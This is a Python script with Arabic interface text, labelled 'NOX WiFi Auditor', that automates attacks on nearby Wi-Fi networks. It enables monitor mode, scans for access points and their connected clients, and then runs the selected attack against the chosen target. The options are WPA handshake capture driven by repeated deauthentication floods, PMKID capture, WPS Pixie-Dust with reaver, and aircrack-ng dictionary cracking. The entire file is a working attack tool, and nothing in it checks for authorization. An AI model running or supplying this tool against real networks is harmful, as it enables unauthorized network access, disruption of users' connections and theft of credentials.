#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import signal
import re
import csv
import shutil
from datetime import datetime

# --- الألوان والتنسيق ---
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# --- شعار الأداة ---
LOGO = f"""{Colors.CYAN}{Colors.BOLD}
███╗   ██╗ ██████╗ ██╗  ██╗    
████╗  ██║██╔═══██╗╚██╗██╔╝    
██╔██╗ ██║██║   ██║ ╚███╔╝     
██║╚██╗██║██║   ██║ ██╔██╗     
██║ ╚████║╚██████╔╝██╔╝ ██╗    
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝    
{Colors.END}{Colors.WHITE}
    [ NOX WiFi Auditor - v1.0 ]
    [ Automated Pentesting Tool ]
{Colors.END}
"""

class NoxAuditor:
    def __init__(self):
        self.interface = None
        self.monitor_mode = False
        self.targets = []
        self.output_dir = "nox_captures"
        self.wordlist = "/usr/share/wordlists/rockyou.txt"
        self.log_file = os.path.join(self.output_dir, "nox_log.txt")
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def clear(self):
        os.system('clear')
        print(LOGO)

    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] يجب تشغيل الأداة بصلاحيات الجذر (sudo).{Colors.END}")
            sys.exit(1)

    def check_dependencies(self):
        deps = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'iw']
        missing = []
        for dep in deps:
            if shutil.which(dep) is None:
                missing.append(dep)
        
        if missing:
            print(f"{Colors.RED}[!] الأدوات التالية مفقودة: {', '.join(missing)}{Colors.END}")
            print(f"{Colors.YELLOW}[*] يرجى تثبيتها باستخدام: sudo apt install aircrack-ng wireless-tools{Colors.END}")
            sys.exit(1)

    def get_interfaces(self):
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        interfaces = re.findall(r'Interface (\w+)', result.stdout)
        return interfaces

    def enable_monitor_mode(self, iface):
        print(f"{Colors.YELLOW}[*] تفعيل وضع المراقبة (Monitor Mode) على {iface}...{Colors.END}")
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
        result = subprocess.run(['airmon-ng', 'start', iface], capture_output=True, text=True)
        
        # البحث عن اسم الواجهة الجديد (غالباً ينتهي بـ mon)
        new_ifaces = self.get_interfaces()
        for ni in new_ifaces:
            if ni.startswith(iface):
                self.interface = ni
                self.monitor_mode = True
                print(f"{Colors.GREEN}[+] تم تفعيل وضع المراقبة: {self.interface}{Colors.END}")
                return True
        return False

    def scan_networks(self):
        self.clear()
        print(f"{Colors.BLUE}[*] جاري مسح الشبكات المحيطة...{Colors.END}")
        print(f"{Colors.YELLOW}[!] اضغط Ctrl+C للتوقف واختيار هدف عندما تظهر الشبكة المطلوبة.{Colors.END}")
        
        csv_file = os.path.join(self.output_dir, "scan_results")
        for f in os.listdir(self.output_dir):
            if f.startswith("scan_results"):
                try: os.remove(os.path.join(self.output_dir, f))
                except: pass

        process = subprocess.Popen([
            'airodump-ng', self.interface,
            '--write', csv_file,
            '--output-format', 'csv',
            '--write-interval', '1'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            while True:
                time.sleep(2)
                self.display_targets(csv_file + "-01.csv")
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print(f"\n{Colors.GREEN}[+] تم إيقاف المسح بنجاح.{Colors.END}")

    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] {message}\n")

    def display_targets(self, csv_path):
        if not os.path.exists(csv_path):
            return

        self.clear()
        print(f"{Colors.BLUE}{'ID':<4} {'BSSID':<20} {'CH':<4} {'PWR':<4} {'ENC':<8} {'CLIENTS':<8} {'ESSID'}{Colors.END}")
        print("-" * 80)
        
        self.targets = []
        stations = {}
        
        try:
            with open(csv_path, 'r') as f:
                content = f.read()
                parts = content.split("Station MAC")
                
                # تحليل المحطات (الأجهزة المتصلة)
                if len(parts) > 1:
                    station_lines = parts[1].strip().split("\n")
                    for line in station_lines:
                        cols = line.split(",")
                        if len(cols) > 5:
                            ap_bssid = cols[5].strip()
                            stations[ap_bssid] = stations.get(ap_bssid, 0) + 1

                # تحليل الشبكات
                network_lines = parts[0].strip().split("\n")
                reader = csv.reader(network_lines)
                start_reading = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if "BSSID" in row[0]:
                        start_reading = True
                        continue
                    if start_reading:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        power = row[8].strip()
                        enc = row[5].strip()
                        essid = row[13].strip()
                        clients = stations.get(bssid, 0)
                        
                        if essid == "": essid = "<Hidden>"
                        
                        target = {
                            'bssid': bssid,
                            'channel': channel,
                            'power': power,
                            'enc': enc,
                            'essid': essid,
                            'clients': clients
                        }
                        self.targets.append(target)
                        idx = len(self.targets)
                        print(f"{idx:<4} {bssid:<20} {channel:<4} {power:<4} {enc:<8} {clients:<8} {essid}")
        except Exception as e:
            pass

    def run(self):
        self.check_root()
        self.check_dependencies()
        self.clear()
        
        ifaces = self.get_interfaces()
        if not ifaces:
            print(f"{Colors.RED}[!] لم يتم العثور على واجهات لاسلكية.{Colors.END}")
            return

        print(f"{Colors.YELLOW}[?] اختر الواجهة اللاسلكية:{Colors.END}")
        for i, iface in enumerate(ifaces):
            print(f" {i+1}) {iface}")
        
        choice = int(input(f"\n{Colors.CYAN}NOX > {Colors.END}")) - 1
        selected_iface = ifaces[choice]
        
        if not self.enable_monitor_mode(selected_iface):
            print(f"{Colors.RED}[!] فشل تفعيل وضع المراقبة.{Colors.END}")
            return

        self.scan_networks()
        
        if not self.targets:
            print(f"{Colors.RED}[!] لم يتم العثور على أهداف.{Colors.END}")
            return

        target_idx = int(input(f"\n{Colors.CYAN}اختر رقم الشبكة المستهدفة: {Colors.END}")) - 1
        target = self.targets[target_idx]
        
        self.attack_menu(target)

    def attack_menu(self, target):
        self.clear()
        print(f"{Colors.GREEN}الهدف المختار: {target['essid']} ({target['bssid']}){Colors.END}")
        print(f"\n{Colors.YELLOW}اختر نوع الهجوم:{Colors.END}")
        print(" 1) WPA/WPA2 Handshake Capture (هجوم تقليدي)")
        print(" 2) PMKID Attack (بدون عملاء متصلين)")
        print(" 3) WPS Pixie-Dust (إذا كان WPS مفعلاً)")
        print(" 4) خروج")
        
        choice = input(f"\n{Colors.CYAN}NOX > {Colors.END}")
        
        if choice == '1':
            self.capture_handshake(target)
        elif choice == '2':
            self.pmkid_attack(target)
        elif choice == '3':
            self.wps_attack(target)
        else:
            sys.exit(0)

    def pmkid_attack(self, target):
        self.clear()
        print(f"{Colors.BLUE}[*] البدء في هجوم PMKID (Clientless) على {target['essid']}...{Colors.END}")
        if shutil.which('hcxdumptool') is None:
            print(f"{Colors.RED}[!] أداة hcxdumptool غير مثبتة. يرجى تثبيتها لهجوم PMKID.{Colors.END}")
            return
        
        output_pcap = os.path.join(self.output_dir, f"{target['essid']}_pmkid.pcapng")
        print(f"{Colors.YELLOW}[*] جاري تشغيل hcxdumptool... انتظر 10 دقائق أو اضغط Ctrl+C.{Colors.END}")
        try:
            subprocess.run([
                'hcxdumptool', '-i', self.interface,
                '-o', output_pcap,
                '--enable_status=1'
            ])
        except KeyboardInterrupt:
            print(f"\n{Colors.GREEN}[+] تم حفظ النتائج في {output_pcap}{Colors.END}")

    def wps_attack(self, target):
        self.clear()
        print(f"{Colors.BLUE}[*] البدء في هجوم WPS Pixie-Dust على {target['essid']}...{Colors.END}")
        if shutil.which('reaver') is None:
            print(f"{Colors.RED}[!] أداة reaver غير مثبتة.{Colors.END}")
            return
        
        subprocess.run([
            'reaver', '-i', self.interface,
            '-b', target['bssid'],
            '-vv', '-K', '1'
        ])

    def capture_handshake(self, target):
        self.clear()
        print(f"{Colors.BLUE}[*] البدء في التقاط Handshake للشبكة {target['essid']}...{Colors.END}")
        
        cap_file = os.path.join(self.output_dir, f"{target['essid'].replace(' ', '_')}_handshake")
        
        # تشغيل airodump في الخلفية للالتقاط
        dump_proc = subprocess.Popen([
            'airodump-ng', self.interface,
            '--bssid', target['bssid'],
            '--channel', target['channel'],
            '--write', cap_file
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"{Colors.YELLOW}[*] إرسال حزم Deauthentication لقطع اتصال الأجهزة وإجبارها على إعادة الاتصال...{Colors.END}")
        
        try:
            # إرسال هجوم Deauth في حلقة حتى يتم التقاط الـ Handshake
            while True:
                subprocess.run([
                    'aireplay-ng', '--deauth', '10',
                    '-a', target['bssid'],
                    self.interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                print(f"{Colors.CYAN}[?] جاري الفحص إذا تم التقاط الـ Handshake...{Colors.END}")
                time.sleep(5)
                
                # التحقق باستخدام aircrack-ng
                check = subprocess.run([
                    'aircrack-ng', cap_file + "-01.cap"
                ], capture_output=True, text=True)
                
                if "1 handshake" in check.stdout:
                    print(f"{Colors.GREEN}[+] تم التقاط الـ Handshake بنجاح!{Colors.END}")
                    dump_proc.terminate()
                    break
                else:
                    print(f"{Colors.RED}[-] لم يتم التقاط الـ Handshake بعد، إعادة المحاولة...{Colors.END}")

            self.crack_handshake(cap_file + "-01.cap", target)
            
        except KeyboardInterrupt:
            dump_proc.terminate()
            print(f"\n{Colors.RED}[!] تم إيقاف العملية.{Colors.END}")

    def crack_handshake(self, cap_path, target):
        print(f"\n{Colors.YELLOW}[?] هل تريد البدء في التخمين (Cracking) الآن؟ (y/n){Colors.END}")
        ans = input(f"{Colors.CYAN}NOX > {Colors.END}")
        
        if ans.lower() == 'y':
            wordlist = input(f"{Colors.YELLOW}[?] أدخل مسار ملف الكلمات (افتراضي: {self.wordlist}): {Colors.END}")
            if not wordlist: wordlist = self.wordlist
            
            if not os.path.exists(wordlist):
                print(f"{Colors.RED}[!] ملف الكلمات غير موجود.{Colors.END}")
                return

            print(f"{Colors.BLUE}[*] جاري التخمين... قد يستغرق هذا وقتاً طويلاً.{Colors.END}")
            subprocess.run([
                'aircrack-ng', '-w', wordlist,
                '-b', target['bssid'],
                cap_path
            ])

if __name__ == "__main__":
    app = NoxAuditor()
    app.run()
